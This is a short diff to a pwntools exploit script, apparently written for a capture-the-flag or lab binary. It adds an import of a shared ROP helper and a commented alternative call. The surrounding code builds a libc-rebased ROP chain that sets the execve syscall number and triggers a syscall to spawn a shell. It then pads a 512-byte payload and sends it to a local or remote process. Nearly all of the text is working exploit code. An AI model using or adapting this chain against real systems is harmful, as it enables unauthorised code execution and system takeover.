@@ -1,4 +1,5 @@
 from pwn import *
+from aslr_common import mkrop as mkrop_common
 
 def mkrop(pad, libc_base):
     rebase_0 = lambda x: p64(x + libc_base)
@@ -31,6 +32,8 @@ def mkrop(pad, libc_base):
     rop += p64(0x000000000000003b)
     rop += rebase_0(0x00000000000580da) # 0x00000000000580da: syscall; ret; 
     return rop
+
+
 
 def get_process():
     if args.REMOTE:
@@ -102,6 +105,7 @@ p.close()
 p = get_process()
 shell = pad
 shell += mkrop(b'', libc_base)
+# shell += mkrop_common(b'', libc_base)  # alternative using common mkrop
 
 payload3 = str(512).encode() + shell
 payload3 += (512 - len(payload3)) * b'C'  # fill to 512 bytes
